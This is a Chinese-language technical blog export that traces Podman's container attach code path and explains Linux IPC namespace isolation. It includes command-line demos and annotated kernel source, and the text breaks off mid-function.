initpodman&#x2F;cmd&#x2F;podman&#x2F;containers&#x2F;attach.go at main · containers&#x2F;podman (github.com) 1234567891011121314func init() &#123; registry.Commands = append(registry.Commands, registry.CliCommand&#123; Command: attachCommand, &#125;) attachFlags(attachCommand) validate.AddLatestFlag(attachCommand, &amp;attachOpts.Latest) registry.Commands = append(registry.Commands, registry.CliCommand&#123; Command: containerAttachCommand, Parent: containerCmd, &#125;) attachFlags(containerAttachCommand) validate.AddLatestFlag(containerAttachCommand, &amp;attachOpts.Latest)&#125; init函数会先于main函数运行，这段代码注册了podman attach命令 attachpodman&#x2F;cmd&#x2F;podman&#x2F;containers&#x2F;attach.go at main · containers&#x2F;podman (github.com) 1234567891011121314151617func attach(cmd *cobra.Command, args []string) error &#123; if len(args) &gt; 1 || (len(args) == 0 &amp;&amp; !attachOpts.Latest) &#123; return errors.New(&quot;attach requires the name or id of one running container or the latest flag&quot;) &#125; var name string if len(args) &gt; 0 &#123; name = strings.TrimPrefix(args[0], &quot;/&quot;) &#125; attachOpts.Stdin = os.Stdin if attachOpts.NoStdin &#123; attachOpts.Stdin = nil &#125; attachOpts.Stdout = os.Stdout attachOpts.Stderr = os.Stderr return registry.ContainerEngine().ContainerAttach(registry.GetContext(), name, attachOpts)&#125; 函数的入口，将实际的attach委托给registry.ContainerEngine().ContainerAttach(registry.GetContext()，name,attachOpts) 其中将stdin，stdout，stderr绑定到attachOpts ContainerAttachpodman&#x2F;pkg&#x2F;domain&#x2F;infra&#x2F;abi&#x2F;containers.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 1234567891011121314151617181920212223242526func (ic *ContainerEngine) ContainerAttach(ctx context.Context, nameOrID string, options entities.AttachOptions) error &#123; containers, err := getContainers(ic.Libpod, getContainersOptions&#123;latest: options.Latest, names: []string&#123;nameOrID&#125;&#125;) if err != nil &#123; return err &#125; if len(containers) != 1 &#123; return fmt.Errorf(&quot;%w: expected to find exactly one container but got %d&quot;, define.ErrInternal, len(containers)) &#125; ctr := containers[0] conState, err := ctr.State() if err != nil &#123; return fmt.Errorf(&quot;unable to determine state of %s: %w&quot;, ctr.ID(), err) &#125; if conState != define.ContainerStateRunning &#123; return fmt.Errorf(&quot;you can only attach to running containers&quot;) &#125; // If the container is in a pod, also set to recursively start dependencies err = terminal.StartAttachCtr(ctx, ctr.Container, options.Stdout, options.Stderr, options.Stdin, options.DetachKeys, options.SigProxy, false) if err != nil &amp;&amp; !errors.Is(err, define.ErrDetach) &#123; return fmt.Errorf(&quot;attaching to container %s: %w&quot;, ctr.ID(), err) &#125; os.Stdout.WriteString(&quot;\\n&quot;) return nil&#125; 首先getContainers获取容器的信息，之后将attach委托给StartAttachCtr。 StartAttachCtrpodman&#x2F;pkg&#x2F;domain&#x2F;infra&#x2F;abi&#x2F;terminal&#x2F;terminal_common.go at main · containers&#x2F;podman (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// StartAttachCtr starts and (if required) attaches to a container// if you change the signature of this function from os.File to io.Writer, it will trigger a downstream// error. we may need to just lint disable this one.func StartAttachCtr(ctx context.Context, ctr *libpod.Container, stdout, stderr, stdin *os.File, detachKeys string, sigProxy bool, startContainer bool) error &#123; //nolint: interfacer resize := make(chan resize.TerminalSize) haveTerminal := term.IsTerminal(int(os.Stdin.Fd())) // Check if we are attached to a terminal. If we are, generate resize // events, and set the terminal to raw mode if haveTerminal &amp;&amp; ctr.Terminal() &#123; cancel, oldTermState, err := handleTerminalAttach(ctx, resize) if err != nil &#123; return err &#125; defer func() &#123; if err := restoreTerminal(oldTermState); err != nil &#123; logrus.Errorf(&quot;Unable to restore terminal: %q&quot;, err) &#125; &#125;() defer cancel() &#125; streams := new(define.AttachStreams) streams.OutputStream = stdout streams.ErrorStream = stderr streams.InputStream = bufio.NewReader(stdin) streams.AttachOutput = true streams.AttachError = true streams.AttachInput = true if stdout == nil &#123; logrus.Debugf(&quot;Not attaching to stdout&quot;) streams.AttachOutput = false &#125; if stderr == nil &#123; logrus.Debugf(&quot;Not attaching to stderr&quot;) streams.AttachError = false &#125; if stdin == nil &#123; logrus.Debugf(&quot;Not attaching to stdin&quot;) streams.AttachInput = false &#125; if sigProxy &#123; // To prevent a race condition, install the signal handler // before starting/attaching to the container. ProxySignals(ctr) &#125; if !startContainer &#123; return ctr.Attach(streams, detachKeys, resize) &#125; attachChan, err := ctr.StartAndAttach(ctx, streams, detachKeys, resize, true) if err != nil &#123; return err &#125; if stdout == nil &amp;&amp; stderr == nil &#123; fmt.Printf(&quot;%s\\n&quot;, ctr.ID()) &#125; err = &lt;-attachChan if err != nil &#123; return fmt.Errorf(&quot;attaching to container %s: %w&quot;, ctr.ID(), err) &#125; return nil&#125; 将attach委托给StartAndAttach StartAndAttachpodman&#x2F;libpod&#x2F;container_api.go at main · containers&#x2F;podman (github.com) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// StartAndAttach starts a container and attaches to it.// This acts as a combination of the Start and Attach APIs, ensuring proper// ordering of the two such that no output from the container is lost (e.g. the// Attach call occurs before Start).// In overall functionality, it is identical to the Start call, with the added// side effect that an attach session will also be started.func (c *Container) StartAndAttach(ctx context.Context, streams *define.AttachStreams, keys string, resize &lt;-chan resize.TerminalSize, recursive bool) (retChan &lt;-chan error, finalErr error) &#123; defer func() &#123; if finalErr != nil &#123; // Have to re-lock. // As this is the first defer, it&#x27;s the last thing to // happen in the function - so `defer c.lock.Unlock()` // below already fired. if !c.batched &#123; c.lock.Lock() defer c.lock.Unlock() &#125; if err := saveContainerError(c, finalErr); err != nil &#123; logrus.Debug(err) &#125; &#125; &#125;() if !c.batched &#123; c.lock.Lock() defer c.lock.Unlock() if err := c.syncContainer(); err != nil &#123; return nil, err &#125; &#125; if err := c.prepareToStart(ctx, recursive); err != nil &#123; return nil, err &#125; attachChan := make(chan error) // We need to ensure that we don&#x27;t return until start() fired in attach. // Use a channel to sync startedChan := make(chan bool) // Attach to the container before starting it go func() &#123; // Start resizing if c.LogDriver() != define.PassthroughLogging &#123; registerResizeFunc(resize, c.bundlePath()) &#125; opts := new(AttachOptions) opts.Streams = streams opts.DetachKeys = &amp;keys opts.Start = true opts.Started = startedChan if err := c.ociRuntime.Attach(c, opts); err != nil &#123; attachChan &lt;- err &#125; close(attachChan) &#125;() select &#123; case err := &lt;-attachChan: return nil, err case &lt;-startedChan: c.newContainerEvent(events.Attach) &#125; return attachChan, nil&#125; Attachpodman&#x2F;libpod&#x2F;oci_conmon_attach_common.go at a1da24de4b5c8ea9133f131cc519d4c9be61714f · containers&#x2F;podman (github.com) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273// Attach to the given container.// Does not check if state is appropriate.// started is only required if startContainer is true.func (r *ConmonOCIRuntime) Attach(c *Container, params *AttachOptions) error &#123; passthrough := c.LogDriver() == define.PassthroughLogging if params == nil || params.Streams == nil &#123; return fmt.Errorf(&quot;must provide parameters to Attach: %w&quot;, define.ErrInternal) &#125; if !params.Streams.AttachOutput &amp;&amp; !params.Streams.AttachError &amp;&amp; !params.Streams.AttachInput &amp;&amp; !passthrough &#123; return fmt.Errorf(&quot;must provide at least one stream to attach to: %w&quot;, define.ErrInvalidArg) &#125; if params.Start &amp;&amp; params.Started == nil &#123; return fmt.Errorf(&quot;started chan not passed when startContainer set: %w&quot;, define.ErrInternal) &#125; keys := config.DefaultDetachKeys if params.DetachKeys != nil &#123; keys = *params.DetachKeys &#125; detachKeys, err := processDetachKeys(keys) if err != nil &#123; return err &#125; var conn *net.UnixConn if !passthrough &#123; logrus.Debugf(&quot;Attaching to container %s&quot;, c.ID()) // If we have a resize, do it. if params.InitialSize != nil &#123; if err := r.AttachResize(c, *params.InitialSize); err != nil &#123; return err &#125; &#125; attachSock, err := c.AttachSocketPath() if err != nil &#123; return err &#125; conn, err = openUnixSocket(attachSock) if err != nil &#123; return fmt.Errorf(&quot;failed to connect to container&#x27;s attach socket: %v: %w&quot;, attachSock, err) &#125; defer func() &#123; if err := conn.Close(); err != nil &#123; logrus.Errorf(&quot;unable to close socket: %q&quot;, err) &#125; &#125;() &#125; // If starting was requested, start the container and notify when that&#x27;s // done. if params.Start &#123; if err := c.start(context.TODO()); err != nil &#123; return err &#125; params.Started &lt;- true &#125; if passthrough &#123; return nil &#125; receiveStdoutError, stdinDone := setupStdioChannels(params.Streams, conn, detachKeys) if params.AttachReady != nil &#123; params.AttachReady &lt;- true &#125; return readStdio(conn, params.Streams, receiveStdoutError, stdinDone)&#125;","categories":[],"tags":[]},{"title":"学习 Linux IPC Namespace实现","slug":"学习-Linux-IPC-Namespace实现","date":"2023-12-29T01:06:55.000Z","updated":"2024-01-10T02:18:13.049Z","comments":true,"path":"2023/12/29/学习-Linux-IPC-Namespace实现/","link":"","permalink":"http://example.com/2023/12/29/%E5%AD%A6%E4%B9%A0-Linux-IPC-Namespace%E5%AE%9E%E7%8E%B0/","excerpt":"简介进程间通讯的机制称为 IPC(Inter-Process Communication)。Linux 下有多种 IPC 机制：管道（PIPE）、命名管道（FIFO）、信号（Signal）、消息队列（Message queues）、信号量（Semaphore）、共享内存（Share Memory）、内存映射（Memory Map）、套接字（Socket）。 其中的三种消息队列（Message queues）、信号量（Semaphore）、共享内存（Share Memory）被称为 XSI IPC，他们源自于 UNIX System V IPC。","text":"简介进程间通讯的机制称为 IPC(Inter-Process Communication)。Linux 下有多种 IPC 机制：管道（PIPE）、命名管道（FIFO）、信号（Signal）、消息队列（Message queues）、信号量（Semaphore）、共享内存（Share Memory）、内存映射（Memory Map）、套接字（Socket）。 其中的三种消息队列（Message queues）、信号量（Semaphore）、共享内存（Share Memory）被称为 XSI IPC，他们源自于 UNIX System V IPC。 Linux 的 IPC Namespace隔离System V IPC对象sysvipc(7) - Linux manual page (man7.org)和POSIX消息队列mq_overview(7) - Linux manual page (man7.org) 每个 IPC 命名空间都有自己的一组 System V IPC 标识符和自己的 POSIX 消息队列文件系统。 在 IPC namespace中创建的对象对于属于该namespace的所有其他进程可见，但对于其他 IPC namespace中的进程不可见。 以下&#x2F;proc接口再每个IPC namespace中都是不同的： &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;mqueue中的POSIX消息队列接口 &#x2F;proc&#x2F;sys&#x2F;kernel中的System V IPC 接口，即：msgmax、msgmnb、msgmni、sem、shmall、shmmax、shmmni 和shm_rmid_forced。 System V IPC 接口位于&#x2F;proc&#x2F;sysvipc 中。 当 IPC namespace被销毁时（即，当作为namespace成员的最后一个进程终止时），命名空间中的所有 IPC 对象都会自动销毁。 操作IPC资源的工具Linux 系统中默认自带了操作 IPC 资源的命令行工具，如 ipcmk、ipcs 和 ipcrm 等。我们可以使用这些工具创建、查看和删除 IPC 资源。 ipcmkipcmk 命令用来创建 IPC资源：共享内存、信号量和消息队列。下面的命令用来创建包含 10 个信号量的信号量集： 1ipcmk -S 10 ipcsipcs 命令显示当前系统中 IPC 资源的信息。默认会显示所有的 IPC 资源，包括共享内存、信号量和消息队列。可以通过命令行中的选项来控制显示的资源类型，比如通过应用 -s 选项，下面的命令只显示系统中 IPC 信号量的信息： 1ipcs -s ipcrmipcrm 命令用来删除系统中的 IPC 资源，此时必须指定资源的类型和标识。比如删除我们刚才创建的 IPC 信号量集： 1ipcrm -s 与namespace相关的工具unshare 命令unshare 命令把当前进程加入到一个新建的 namespace 中，然后运行指定的程序(不指定目标程序则运行系统的默认 shell)。在前文《Linux Namespace: UTS》中我们介绍了一些与 namespace 相关的 API，比如 unshare 函数。unshare 函数的功能是把当前进程加入到一个新建的 namespace 中。比起我们自己写的小 demo，系统工具中已经内置了 unshare 命令行工具，本文将使用系统中的 unshare 命令进行相关的演示。对 unshare 命令的实现感兴趣的朋友可以参考其源代码，它也是通过调用 unshare 函数实现的。下面的例子就是通过 unshare 命令让新建的 bash 进程属于新的 IPC namespace： 1sudo unshare -i nsenter 命令nsenter 命令把当前进程加入到指定进程的 namespace 中，然后运行指定的程序(不指定目标程序则运行系统的默认 shell)。 1sudo nsenter -t [pid] -i IPC namespace隔离接下来让我们通过 IPC 信号量的隔离来了解如何隔离 IPC namespace。 首先我们打开两个 bash shell，为了方便区分，分别把它们称为为 shell1 和 shell2。先在 shell2 中执行 sudo unshare -i，然后分别执行 readlink &#x2F;proc&#x2F;$$&#x2F;ns&#x2F;ipc 命令： shell1 ipc:[4026531839] shell2 ipc:[4026532739] 然后我们在 shell2 中创建 IPC 信号量集ipcmk -S 10，并分别在两个 shell 中进行ipcs -s查看： shell1 —— Semaphore Arrays ——–key semid owner perms nsems shell2 —— Semaphore Arrays ——–key semid owner perms nsems0xf0ebf454 0 root 644 10 结果显示，shell1 中不能观察到 shell2 中创建的 IPC 信号量集，这是因为 shell1 和 shell2 此时分别在不同的 IPC namespace 中。 接下来我们在 shell1 中启动一个新的 bash 进程，并通过 nsenter 命令把它加入到 shell2 的 IPC namespace 中，然后再次查看 IPC 信号量信息： 1echo $$ #查看当前进程的pid shell2 1sudo nsenter -t [shell1-pid] -i 1ipcs -s —— Semaphore Arrays ——–key semid owner perms nsems0xf0ebf454 0 root 644 10 这次 shell1 中显示的信号量信息和 shell2 中是一样的。 最后让我们看看此时 shell1 和 shell2 中当前进程的 IPC namespace： shell1 ipc:[4026532739] 可知shell1的ipc ns与shell2的相同 源码分析创建IPC NScopy_ipcs()在进程创建或者 unshare()&#x2F;setns() 系统调用时，如果设置了 CLONE_NEWIPC 标志会调用 copy_ipcs() 创建一个新的 IPC namespace。其中的核心是创建一个新的 struct ipc_namespace 结构，相当于创建了一个新的 XSI IPC 域： namespace.c - ipc&#x2F;namespace.c - Linux source code (v6.6.6) - Bootlin 1234567struct ipc_namespace *copy_ipcs(unsigned long flags, struct user_namespace *user_ns, struct ipc_namespace *ns)&#123; if (!(flags &amp; CLONE_NEWIPC)) return get_ipc_ns(ns); return create_ipc_ns(user_ns, ns);&#125; create_ipc_ns()namespace.c - ipc&#x2F;namespace.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273static struct ipc_namespace *create_ipc_ns(struct user_namespace *user_ns, struct ipc_namespace *old_ns)&#123; struct ipc_namespace *ns; // 声明指向 ipc_namespace 结构的指针 struct ucounts *ucounts; // 声明指向 ucounts 结构的指针 int err; err = -ENOSPC; // 设置默认错误代码以指示无空间 again: ucounts = inc_ipc_namespaces(user_ns); // 增加 IPC 命名空间的引用计数 if (!ucounts) &#123; /* * IPC 命名空间会异步释放，由 free_ipc_work 处理。 * 如果有待释放的资源，flush_work 将等待它们完成，并 * 返回 true。如果没有待释放的资源，表示分配失败。 */ if (flush_work(&amp;free_ipc_work)) // 如果有待释放的资源，等待它们完成 goto again; goto fail; // 如果没有待释放的资源，跳转到失败标签 &#125; err = -ENOMEM; // 设置错误代码以指示无内存 //为新的 ipc_namespace 结构分配内存 ns = kzalloc(sizeof(struct ipc_namespace), GFP_KERNEL_ACCOUNT); if (ns == NULL) goto fail_dec; // 如果分配失败，跳转到失败标签 err = ns_alloc_inum(&amp;ns-&gt;ns); // 分配 IPC 命名空间标识符 if (err) goto fail_free; // 如果分配失败，跳转到失败标签 ns-&gt;ns.ops = &amp;ipcns_operations; // 设置 ipc_namespace 的操作 refcount_set(&amp;ns-&gt;ns.count, 1); // 将 ipc_namespace 的引用计数设置为 1 ns-&gt;user_ns = get_user_ns(user_ns); // 获取并设置 ipc_namespace 的用户命名空间 ns-&gt;ucounts = ucounts; // 设置 ipc_namespace 的 ucounts 指针 err = mq_init_ns(ns); // 初始化 ipc_namespace 的消息队列 if (err) goto fail_put; // 如果初始化失败，跳转到失败标签 err = -ENOMEM; // 设置错误代码以指示无内存 // 为 ipc_namespace 设置消息队列 sysctl 参数 if (!setup_mq_sysctls(ns)) goto fail_put; // 如果设置失败，跳转到失败标签 // 为 ipc_namespace 设置 IPC sysctl 参数 if (!setup_ipc_sysctls(ns)) goto fail_mq; // 如果设置失败，跳转到失败标签 err = msg_init_ns(ns); // 初始化 ipc_namespace 的消息 if (err) goto fail_put; // 如果初始化失败，跳转到失败标签 sem_init_ns(ns); // 初始化 ipc_namespace 的信号量 shm_init_ns(ns); // 初始化 ipc_namespace 的共享内存 return ns; // 返回成功创建的 ipc_namespacefail_mq: retire_mq_sysctls(ns); // 释放消息队列 sysctl 参数fail_put: put_user_ns(ns-&gt;user_ns); // 释放用户命名空间 ns_free_inum(&amp;ns-&gt;ns); // 释放 ipc_namespace 标识符fail_free: kfree(ns); // 释放为 ipc_namespace 分配的内存fail_dec: dec_ipc_namespaces(ucounts); // 减少 IPC 命名空间的引用计数fail: return ERR_PTR(err); // 返回指示失败的错误指针&#125; ipcget()三种 XSI IPC 的实现机制也是非常类似的，IPC namespace 提供了对应的3个 idr 池 ns-&gt;ids[3] ，每新建一个 XSI IPC 对象，会从对应的 idr 池中分配一个 key。 util.c - ipc&#x2F;util.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516171819/** * ipcget - 通用的 sys_*get() 代码 * @ns: 命名空间 * @ids: IPC 标识符集合 * @ops: 在 IPC 对象创建、权限检查和进一步检查时要调用的操作 * @params: 由前述操作需要的参数 * * 被 sys_msgget()、sys_semget() 和 sys_shmget() 调用的通用例程。 */int ipcget(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params)&#123; // 如果 key 是 IPC_PRIVATE，则调用 ipcget_new() 函数 if (params-&gt;key == IPC_PRIVATE) return ipcget_new(ns, ids, ops, params); // 否则调用 ipcget_public() 函数 else return ipcget_public(ns, ids, ops, params);&#125; 以信号量 sem 为例，来分析一下这个过程： semgetsem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin 1234SYSCALL_DEFINE3(semget, key_t, key, int, nsems, int, semflg)&#123; return ksys_semget(key, nsems, semflg);&#125; ksys_semget12345678910111213141516171819202122long ksys_semget(key_t key, int nsems, int semflg)&#123; struct ipc_namespace *ns; // 构造ipc_ops参数 static const struct ipc_ops sem_ops = &#123; .getnew = newary, .associate = security_sem_associate, .more_checks = sem_more_checks, &#125;; struct ipc_params sem_params; // 构造ipc namespace参数 ns = current-&gt;nsproxy-&gt;ipc_ns; if (nsems &lt; 0 || nsems &gt; ns-&gt;sc_semmsl) return -EINVAL; // 构造ipc_params参数 sem_params.key = key; sem_params.flg = semflg; sem_params.u.nsems = nsems; // 根据key查询已有的ipcp，或者创建心得ipcp return ipcget(ns, &amp;sem_ids(ns), &amp;sem_ops, &amp;sem_params);&#125; ipc_getutil.c - ipc&#x2F;util.c - Linux source code (v6.6.6) - Bootlin 123456789101112131415161718/** * ipcget - Common sys_*get() code * @ns: namespace * @ids: ipc identifier set * @ops: operations to be called on ipc object creation, permission checks * and further checks * @params: the parameters needed by the previous operations. * * Common routine called by sys_msgget(), sys_semget() and sys_shmget(). */int ipcget(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params)&#123; if (params-&gt;key == IPC_PRIVATE) return ipcget_new(ns, ids, ops, params); else return ipcget_public(ns, ids, ops, params);&#125; ipcget_publicutil.c - ipc&#x2F;util.c - Linux source code (v6.6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * ipcget_public - get an ipc object or create a new one * @ns: ipc namespace * @ids: ipc identifier set * @ops: the actual creation routine to call * @params: its parameters * * This routine is called by sys_msgget, sys_semget() and sys_shmget() * when the key is not IPC_PRIVATE. * It adds a new entry if the key is not found and does some permission * / security checkings if the key is found. * * On success, the ipc id is returned. */static int ipcget_public(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params)&#123; struct kern_ipc_perm *ipcp; int flg = params-&gt;flg; int err; /* * Take the lock as a writer since we are potentially going to add * a new entry + read locks are not &quot;upgradable&quot; */ down_write(&amp;ids-&gt;rwsem); // 根据key在信号量 idr 池 `ns-&gt;ids[IPC_SEM_IDS]`中查找对应的ipcp ipcp = ipc_findkey(ids, params-&gt;key); if (ipcp == NULL) &#123; /* key not used */ if (!(flg &amp; IPC_CREAT)) err = -ENOENT; else // 如果key对应的ipcp不存在，且设置了IPC_CREAT标志则根据key创建一个新的ipcp err = ops-&gt;getnew(ns, params); &#125; else &#123; /* ipc object has been locked by ipc_findkey() */ if (flg &amp; IPC_CREAT &amp;&amp; flg &amp; IPC_EXCL) err = -EEXIST; else &#123; err = 0; // 如果key对应的ipcp存在，则针对参数进行第一步的检查 if (ops-&gt;more_checks) err = ops-&gt;more_checks(ipcp, params); if (!err) /* * ipc_check_perms returns the IPC id on * success */ // ipcp存在，针对参数做第二步的权限检查 err = ipc_check_perms(ns, ipcp, ops, params); &#125; ipc_unlock(ipcp); &#125; up_write(&amp;ids-&gt;rwsem); return err;&#125; newary在函数ksys_semget中，ipc_ops设置为了newary 12345 static const struct ipc_ops sem_ops = &#123; .getnew = newary, .associate = security_sem_associate, .more_checks = sem_more_checks,&#125;; sem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * newary - Create a new semaphore set * @ns: namespace * @params: ptr to the structure that contains key, semflg and nsems * * Called with sem_ids.rwsem held (as a writer) */static int newary(struct ipc_namespace *ns, struct ipc_params *params)&#123; int retval; struct sem_array *sma; key_t key = params-&gt;key; int nsems = params-&gt;u.nsems; int semflg = params-&gt;flg; int i; if (!nsems) return -EINVAL; if (ns-&gt;used_sems + nsems &gt; ns-&gt;sc_semmns) return -ENOSPC; // 分配nsems个信号量的数据结构sem_array[] sma = sem_alloc(nsems); if (!sma) return -ENOMEM; // 初始化其中的ipcp成员，保存UGO模式，保存对应的key sma-&gt;sem_perm.mode = (semflg &amp; S_IRWXUGO); sma-&gt;sem_perm.key = key; sma-&gt;sem_perm.security = NULL; retval = security_sem_alloc(&amp;sma-&gt;sem_perm); if (retval) &#123; kvfree(sma); return retval; &#125; for (i = 0; i &lt; nsems; i++) &#123; INIT_LIST_HEAD(&amp;sma-&gt;sems[i].pending_alter); INIT_LIST_HEAD(&amp;sma-&gt;sems[i].pending_const); spin_lock_init(&amp;sma-&gt;sems[i].lock); &#125; sma-&gt;complex_count = 0; sma-&gt;use_global_lock = USE_GLOBAL_LOCK_HYSTERESIS; INIT_LIST_HEAD(&amp;sma-&gt;pending_alter); INIT_LIST_HEAD(&amp;sma-&gt;pending_const); INIT_LIST_HEAD(&amp;sma-&gt;list_id); sma-&gt;sem_nsems = nsems; sma-&gt;sem_ctime = ktime_get_real_seconds(); /* ipc_addid() locks sma upon success. */ // 赋值 ipcp 中的 uid、gid并将新分配的ipcp加入信号量 idr 池 `ns-&gt;ids[IPC_SEM_IDS]`中 retval = ipc_addid(&amp;sem_ids(ns), &amp;sma-&gt;sem_perm, ns-&gt;sc_semmni); if (retval &lt; 0) &#123; ipc_rcu_putref(&amp;sma-&gt;sem_perm, sem_rcu_free); return retval; &#125; ns-&gt;used_sems += nsems; sem_unlock(sma, -1); rcu_read_unlock(); return sma-&gt;sem_perm.id;&#125; ipc_addidutil.c - ipc&#x2F;util.c - Linux source code (v6.6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * ipc_addid - add an ipc identifier * @ids: ipc identifier set * @new: new ipc permission set * @limit: limit for the number of used ids * * Add an entry &#x27;new&#x27; to the ipc ids idr. The permissions object is * initialised and the first free entry is set up and the index assigned * is returned. The &#x27;new&#x27; entry is returned in a locked state on success. * * On failure the entry is not locked and a negative err-code is returned. * The caller must use ipc_rcu_putref() to free the identifier. * * Called with writer ipc_ids.rwsem held. */int ipc_addid(struct ipc_ids *ids, struct kern_ipc_perm *new, int limit)&#123; kuid_t euid; kgid_t egid; int idx, err; /* 1) Initialize the refcount so that ipc_rcu_putref works */ refcount_set(&amp;new-&gt;refcount, 1); if (limit &gt; ipc_mni) limit = ipc_mni; if (ids-&gt;in_use &gt;= limit) return -ENOSPC; idr_preload(GFP_KERNEL); spin_lock_init(&amp;new-&gt;lock); rcu_read_lock(); spin_lock(&amp;new-&gt;lock); // 获取当前进程的uid/gid，赋值给 ipcp 的相关成员，类似文件的 `chown uid:gid ` 操作 current_euid_egid(&amp;euid, &amp;egid); new-&gt;cuid = new-&gt;uid = euid; new-&gt;gid = new-&gt;cgid = egid; new-&gt;deleted = false; idx = ipc_idr_alloc(ids, new); idr_preload_end(); // 加入信号量 idr 池 `ns-&gt;ids[IPC_SEM_IDS]`中 if (idx &gt;= 0 &amp;&amp; new-&gt;key != IPC_PRIVATE) &#123; err = rhashtable_insert_fast(&amp;ids-&gt;key_ht, &amp;new-&gt;khtnode, ipc_kht_params); if (err &lt; 0) &#123; idr_remove(&amp;ids-&gt;ipcs_idr, idx); idx = err; &#125; &#125; if (idx &lt; 0) &#123; new-&gt;deleted = true; spin_unlock(&amp;new-&gt;lock); rcu_read_unlock(); return idx; &#125; ids-&gt;in_use++; if (idx &gt; ids-&gt;max_idx) ids-&gt;max_idx = idx; return idx;&#125; ipc_check_parm从上一节可以看到 key 被包含在 ipcp 即 struct kern_ipc_perm 结构中： ipc.h - include&#x2F;linux&#x2F;ipc.h - Linux source code (v6.6.6) - Bootlin 12345678910111213141516171819/* used by in-kernel data structures */struct kern_ipc_perm &#123; spinlock_t lock; bool deleted; int id; key_t key; kuid_t uid; kgid_t gid; kuid_t cuid; kgid_t cgid; umode_t mode; unsigned long seq; void *security; struct rhash_head khtnode; struct rcu_head rcu; refcount_t refcount;&#125; ____cacheline_aligned_in_smp __randomize_layout; 在 sem,shm,mq 对象中都有这个成员的存在： sem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin 123456789101112131415/* One sem_array data structure for each set of semaphores in the system. */struct sem_array &#123; struct kern_ipc_perm sem_perm; /* permissions .. see ipc.h */ time64_t sem_ctime; /* create/last semctl() time */ struct list_head pending_alter; /* pending operations */ /* that alter the array */ struct list_head pending_const; /* pending complex operations */ /* that do not alter semvals */ struct list_head list_id; /* undo requests on this array */ int sem_nsems; /* no. of semaphores in array */ int complex_count; /* pending complex operations */ unsigned int use_global_lock;/* &gt;0: global lock required */ struct sem sems[];&#125; __randomize_layout; shm.c - ipc&#x2F;shm.c - Linux source code (v6.6.6) - Bootlin 1234567891011121314151617181920212223242526struct shmid_kernel /* private to the kernel */&#123; struct kern_ipc_perm shm_perm; struct file *shm_file; unsigned long shm_nattch; unsigned long shm_segsz; time64_t shm_atim; time64_t shm_dtim; time64_t shm_ctim; struct pid *shm_cprid; struct pid *shm_lprid; struct ucounts *mlock_ucounts; /* * The task created the shm object, for * task_lock(shp-&gt;shm_creator) */ struct task_struct *shm_creator; /* * List by creator. task_lock(-&gt;shm_creator) required for read/write. * If list_empty(), then the creator is dead already. */ struct list_head shm_clist; struct ipc_namespace *ns;&#125; __randomize_layout; msg.c - ipc&#x2F;msg.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516/* one msq_queue structure for each present queue on the system */struct msg_queue &#123; struct kern_ipc_perm q_perm; time64_t q_stime; /* last msgsnd time */ time64_t q_rtime; /* last msgrcv time */ time64_t q_ctime; /* last change time */ unsigned long q_cbytes; /* current number of bytes on queue */ unsigned long q_qnum; /* number of messages in queue */ unsigned long q_qbytes; /* max number of bytes on queue */ struct pid *q_lspid; /* pid of last msgsnd */ struct pid *q_lrpid; /* last receive pid */ struct list_head q_messages; struct list_head q_receivers; struct list_head q_senders;&#125; __randomize_layout; struct kern_ipc_perm 的 -&gt;key 成员保存了key值；-&gt;mode 成员保存了 UGO 操作权限，类似文件的 chmod 777 属性；-&gt;uid/gid/cuid/cgid 成员保存了属主 uid&#x2F;gid，类似文件的 chown uid:gid 操作。 在 ipc_check_perms() 函数中，会对被操作的 sem,shm,mq 对象，进行 UGO 权限检查： util.c - ipc&#x2F;util.c - Linux source code (v6.6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132/** * ipc_check_perms - check security and permissions for an ipc object * @ns: ipc namespace * @ipcp: ipc permission set * @ops: the actual security routine to call * @params: its parameters * * This routine is called by sys_msgget(), sys_semget() and sys_shmget() * when the key is not IPC_PRIVATE and that key already exists in the * ds IDR. * * On success, the ipc id is returned. * * It is called with ipc_ids.rwsem and ipcp-&gt;lock held. */static int ipc_check_perms(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp, const struct ipc_ops *ops, struct ipc_params *params)&#123; int err; if (ipcperms(ns, ipcp, params-&gt;flg)) err = -EACCES; else &#123; err = ops-&gt;associate(ipcp, params-&gt;flg); if (!err) err = ipcp-&gt;id; &#125; return err;&#125; ipc_check_perms() → ipcperms() 123456789101112131415161718192021222324252627282930313233343536/** * ipcperms - check ipc permissions * @ns: ipc namespace * @ipcp: ipc permission set * @flag: desired permission set * * Check user, group, other permissions for access * to ipc resources. return 0 if allowed * * @flag will most probably be 0 or ``S_...UGO`` from &lt;linux/stat.h&gt; */int ipcperms(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp, short flag)&#123; kuid_t euid = current_euid(); int requested_mode, granted_mode; audit_ipc_obj(ipcp); // 或请求的 UGO 操作 requested_mode = (flag &gt;&gt; 6) | (flag &gt;&gt; 3) | flag; // 获取 ipcp 的 UGO 规则 granted_mode = ipcp-&gt;mode; // 如果当前进程 和 ipcp 对象 uid 相等，则取用 U 规则 if (uid_eq(euid, ipcp-&gt;cuid) || uid_eq(euid, ipcp-&gt;uid)) granted_mode &gt;&gt;= 6; // 如果当前进程 和 ipcp 对象 gid 相等，则取用 G 规则 else if (in_group_p(ipcp-&gt;cgid) || 